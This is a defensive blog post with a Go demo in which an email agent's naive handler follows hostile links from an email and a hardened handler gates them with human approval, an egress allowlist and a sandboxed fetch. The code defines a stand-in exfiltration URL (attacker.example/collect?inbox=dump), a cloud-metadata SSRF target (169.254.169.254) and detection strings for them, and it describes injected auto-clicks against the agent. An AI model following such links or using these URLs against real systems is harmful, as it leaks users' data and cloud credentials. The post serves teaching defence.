---
title: "Action links"
description: "An action link is the sharpest thing an email can carry: a URL it wants acted on, and acting on one is where the human gate, the egress policy, and the sandbox fetch all meet. A naive agent that just follows the link lets an email exfiltrate data or reach the cloud metadata service. The agent requires a human to approve the exact action, checks the URL against the egress allowlist, and only then fetches it, inside the sandbox."
date: 2026-06-30
draft: false
tags: ["ai-security", "golang", "agents", "ssrf"]
series: "AI Security Engineering"
---

_Part of my [AI Security Engineering](/blog/the-plan/) series, a local email-to-calendar agent I build, then attack, then harden. If you have not set up the lab yet, start with [Set up your lab](/blog/setting-up-the-lab/). The lessons are [on GitHub](https://github.com/t0ul/ai-security-engineering), and the agent itself lives at [t0ul/emaildrop](https://github.com/t0ul/emaildrop)._

## The one thing that acts

Two posts ago the agent learned to tag a link in an email as an action, kept separate from the quiet to-do list precisely so a human would see it. This post is about what happens when someone actually acts on it. An action link is the single most dangerous thing the agent handles, because following it is a real outbound request: it can carry data out of the house, or reach inward to something only the machine can see. Every other feature so far produced text; this one produces a network call.

So it is where three controls from earlier chapters have to stand together at once: the human gate that makes a person approve the exact action, the egress policy that says which hosts are reachable at all, and the sandbox that the fetch actually runs inside. Any one alone is not enough. A control lesson, deterministic, no model:

```bash
cd posts/13.5-action-links
go run .
```

The whole program is on this page, in the order it runs, so you can type it in instead of cloning. Make an empty folder, run `go mod init actions`, then `go get github.com/t0ul/emaildrop@` followed by the version on the `require` line below, and put the code in one file called `main.go`:

<!-- listing: go.mod#all -->
```
module github.com/t0ul/ai-security-engineering/posts/13.5-action-links

go 1.27.1

// The agent's real human-approval gate and egress policy. No overrides.
require github.com/t0ul/emaildrop v0.0.0-20261011232453-771805568f76
```
<!-- /listing -->

## The spine of the program

`main` runs the attack against the naive handler and against the stack, and the receipt needs both links to go out the first time and neither the second, with a genuine RSVP still fetched.

<!-- listing: main.go#head -->
```go
// Command main is the runnable demo for lesson 13.5, action links.
//
// Run it with:
//
//	go run .
//
// An action link is the sharpest thing an email can carry: a URL it wants acted
// on. Acting on one is where the human gate, the egress policy, and the sandbox
// fetch all meet. A naive agent that just follows the link lets an email exfiltrate
// data or reach the cloud metadata service. The agent requires a human to approve
// the exact action, checks the URL against the egress allowlist, and only then
// fetches it inside the sandbox. Deterministic, no model.
package main

import (
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/hitl"
	"github.com/t0ul/emaildrop/pkg/netpolicy"
)

func main() {
	undef := attackLandsUndefended()
	def := stackRefuses()
	fmt.Println()
	if undef && def {
		fmt.Println("attack blocked (the receipt): a naive agent follows an exfil or metadata link; the agent requires a human to approve the exact action, checks the URL against the egress allowlist, and only fetches an approved, allowlisted link in the sandbox")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}
```
<!-- /listing -->

Three links, two hostile and one the owner wants, and the one thing that matters about any of them: `wentOut` records every URL actually fetched. The fetch itself stands in for the real sandboxed one, which in the agent runs inside the MicroVM and never from the host.

<!-- listing: main.go#the links, and the fetch that leaves the host -->
```go
// ---- the links, and the fetch that leaves the host ----

const (
	exfilURL    = "http://attacker.example/collect?inbox=dump" // send data out
	imdsURL     = "http://169.254.169.254/latest/meta-data/"   // reach cloud metadata
	legitURL    = "http://calendar.school.example/rsvp/42"     // a real RSVP the owner wants
	legitMarker = "RSVP"
)

// wentOut records every URL actually fetched: an action link's whole danger is
// that fetching it moves data or reaches somewhere it should not.
var wentOut []string

// vmFetch stands in for the real sandboxed fetch (controlplane ExecuteFetch ->
// the MicroVM): the request leaves only from inside the chamber, never the host.
func vmFetch(url string) { wentOut = append(wentOut, url) }
```
<!-- /listing -->

## Follow the link, lose

The naive action handler is one line: the email has a link, so fetch it.

<!-- listing: main.go#before: follow the link -->
```go
// ---- before: follow the link ----

// actNaive is the obvious action handler: the email has a link, so fetch it.
func actNaive(url string) { vmFetch(url) }
```
<!-- /listing -->

Run it against two links an attacker would love the agent to follow, one that posts your inbox to their server and one that reads the cloud metadata service.

```
== before: the agent follows the link ==
  what left the machine: [http://attacker.example/collect?inbox=dump http://169.254.169.254/latest/meta-data/]
  action-link-exfil ASR: 100% (2/2)
```

Both went out. The first is a straight exfiltration; the second is the SSRF-to-metadata chain from the trifecta post, arriving this time as a friendly button in a newsletter. The agent did exactly what the email asked, which is the whole problem with a thing that acts on an untrusted instruction.

## Three gates the link has to pass

The agent will act on a link only after it clears all three controls, in order. That is `actGuarded`: the human's echoed nonce first, the egress policy second, and only then the sandboxed fetch.

<!-- listing: main.go#after: human gate, then egress policy, then sandbox -->
```go
// ---- after: human gate, then egress policy, then sandbox ----

// actGuarded acts on a link only when a human approved THIS action (echoing the
// nonce shown with the evidence) and the URL passes the egress allowlist. Only
// then does the fetch run, inside the sandbox.
func actGuarded(req hitl.Request, echoedNonce string, pol netpolicy.Policy, url string) (bool, string) {
	if ok, err := req.Confirm(echoedNonce, true); !ok {
		return false, errStr(err) // the gate names itself in its error
	}
	if err := pol.Check(url); err != nil {
		return false, errStr(err) // so does the policy
	}
	vmFetch(url)
	return true, "fetched in sandbox"
}
```
<!-- /listing -->

Under it are the policy, which allows only the school's calendar host, and the oracle, which asks whether anything hostile left the machine:

<!-- listing: main.go#the policy, and the oracle -->
```go
// ---- the policy, and the oracle ----

func errStr(e error) string {
	if e == nil {
		return "refused"
	}
	return e.Error()
}

func sentExfilOrInternal() bool {
	for _, u := range wentOut {
		if strings.Contains(u, "attacker.example") || strings.Contains(u, "169.254.169.254") {
			return true
		}
	}
	return false
}

// pol is the egress allowlist: only the school calendar host is permitted out.
func pol() netpolicy.Policy {
	return netpolicy.Policy{
		Allow:   []string{"calendar.school.example"},
		Resolve: func(string) ([]net.IP, error) { return []net.IP{net.ParseIP("93.184.216.34")}, nil }, // a public IP
	}
}
```
<!-- /listing -->

The two runs `main` calls fire the attack at each handler; the second fires three shapes to show each control catching what the others might not:

<!-- listing: main.go#the attack, against the naive handler and against the stack -->
```go
// ---- the attack, against the naive handler and against the stack ----

func attackLandsUndefended() bool {
	fmt.Println("== before: the agent follows the link ==")
	wentOut = nil
	for _, u := range []string{exfilURL, imdsURL} {
		actNaive(u)
	}
	landed := sentExfilOrInternal()
	fmt.Printf("  what left the machine: %v\n", wentOut)
	fmt.Printf("  action-link-exfil ASR: %d%% (%d/2)\n", pct(len(wentOut), 2), len(wentOut))
	return landed && len(wentOut) == 2
}

func stackRefuses() bool {
	fmt.Println("\n== after: human gate, egress policy, sandbox ==")
	wentOut = nil
	p := pol()

	// 1. An injected auto-click: no human saw the evidence, so no nonce to echo.
	req1 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r1 := actGuarded(req1, "", p, exfilURL) // empty nonce
	fmt.Printf("  auto-click (no human):        refused: %s\n", r1)

	// 2. A human approves, but the link exfiltrates to a non-allowlisted host.
	req2 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r2 := actGuarded(req2, req2.Nonce(), p, exfilURL)
	fmt.Printf("  approved, exfil host:         refused: %s\n", r2)

	// 3. A human approves, but the link reaches the cloud metadata service.
	req3 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r3 := actGuarded(req3, req3.Nonce(), p, imdsURL)
	fmt.Printf("  approved, metadata host:      refused: %s\n", r3)

	leaked := sentExfilOrInternal()
	fmt.Printf("  action-link-exfil ASR: %d%% (%d/2)\n", pct(countBad(), 2), countBad())

	// A genuine RSVP the owner approves, to an allowlisted host, still goes through.
	req4 := hitl.NewRequest("RSVP to the field trip", "source: trip.txt")
	okLegit, r4 := actGuarded(req4, req4.Nonce(), p, legitURL)
	fmt.Printf("  genuine RSVP (approved, allowlisted): %v (%s)\n", okLegit, r4)

	return !leaked && okLegit
}
```
<!-- /listing -->

First the [human gate](/blog/the-human-gate/). Acting requires a person to approve this specific action by echoing a nonce shown with the evidence, so an injected auto-click, one no human ever saw, has no nonce to give.

```
  auto-click (no human):        refused: hitl: nonce mismatch (dialog not the one shown; possible clickjack)
```

Then the [egress policy](/blog/a-search-tool-hits-a-local-server/). Even a link a tired human might approve has to resolve to an allowlisted host, so the exfil server and the metadata address are both refused before any connection opens.

```
  approved, exfil host:         refused: netpolicy: host is not on the egress allowlist: "attacker.example"
  approved, metadata host:      refused: netpolicy: host is not on the egress allowlist: "169.254.169.254"
```

And the fetch that does eventually run, for a link that passed both, runs inside the sandbox from the isolation chapter, through the one audited exit, so even a request that is allowed cannot touch the host directly. Stacked, the attack goes nowhere.

```
  action-link-exfil ASR: 0% (0/2)
  genuine RSVP (approved, allowlisted): true (fetched in sandbox)
```

Zero exfiltration, and the genuine RSVP, approved by the owner and pointing at the school's own calendar host, still goes through. The agent did not become unable to follow links; it became unable to follow a link that a human did not approve, to a host that is not allowed, outside the box.

The two helpers count the hostile fetches and turn a fraction into a percentage:

<!-- listing: main.go#helpers -->
```go
// ---- helpers ----

func countBad() int {
	n := 0
	for _, u := range wentOut {
		if strings.Contains(u, "attacker.example") || strings.Contains(u, "169.254.169.254") {
			n++
		}
	}
	return n
}

func pct(n, d int) int { return n * 100 / d }
```
<!-- /listing -->

That is the whole program. Its tests assert both halves and then each leg on its own; put them next to `main.go` as `contract_test.go`:

<!-- listing: contract_test.go#all -->
```go
package main

import (
	"testing"

	"github.com/t0ul/emaildrop/pkg/hitl"
	"github.com/t0ul/emaildrop/pkg/netpolicy"
)

// Deterministic, no model. A naive agent follows an exfil or metadata action link;
// the stacked human gate, egress policy, and sandbox fetch refuse every variant
// while a genuine approved, allowlisted RSVP still goes through. The exfil and
// metadata URLs are benign markers; nothing is actually fetched.

func TestActionLinkExfilLandsUndefended(t *testing.T) {
	if !attackLandsUndefended() {
		t.Fatal("a naive agent must follow the exfil and metadata links; otherwise there is nothing to defend")
	}
}

func TestStackRefusesEveryVariantAllowsGenuine(t *testing.T) {
	if !stackRefuses() {
		t.Fatal("the stack must refuse auto-click, exfil, and metadata links, and still allow a genuine approved RSVP")
	}
}

func TestEachLegIndependently(t *testing.T) {
	p := pol()
	// HITL: no echoed nonce is refused.
	req := hitl.NewRequest("x", "evidence")
	if ok, _ := actGuarded(req, "", p, legitURL); ok {
		t.Fatal("hitl must refuse an action with no approved nonce")
	}
	// netpolicy: an allowlisted host passes, a non-allowlisted one does not.
	if err := p.Check(legitURL); err != nil {
		t.Fatalf("the allowlisted host should pass netpolicy, got %v", err)
	}
	if err := p.Check(exfilURL); err == nil {
		t.Fatal("netpolicy must refuse a non-allowlisted exfil host")
	}
	_ = netpolicy.Policy{}
}
```
<!-- /listing -->

## Defense in depth, where it is needed most

It is not an accident that the most dangerous feature is the one with the most controls on it, and that they are controls you have already seen. Nothing here is new; action links are just the place where human approval, egress filtering, and sandboxing all become load-bearing at the same moment, because this is the one operation that reaches past the agent into the world. Each gate covers a different failure of the others: the human gate stops an action nobody intended, the egress policy stops an intended action aimed somewhere it should not go, and the sandbox stops whatever slips past both from reaching the host. A link has to beat all three, and they were built so that beating all three at once is the thing no single clever email can do.

That is the agent's riskiest surface contained. The next feature is quieter but just as important to get right: the calendar's own writes and exports, where the danger is not an attacker at all but the agent doing the same safe thing twice.

## Take it to your own project

Make action links safe to hand out:

- Make them unguessable, scoped, single-use, and expiring.
- Keep the human gate behind them.
- Sign them so they cannot be forged.
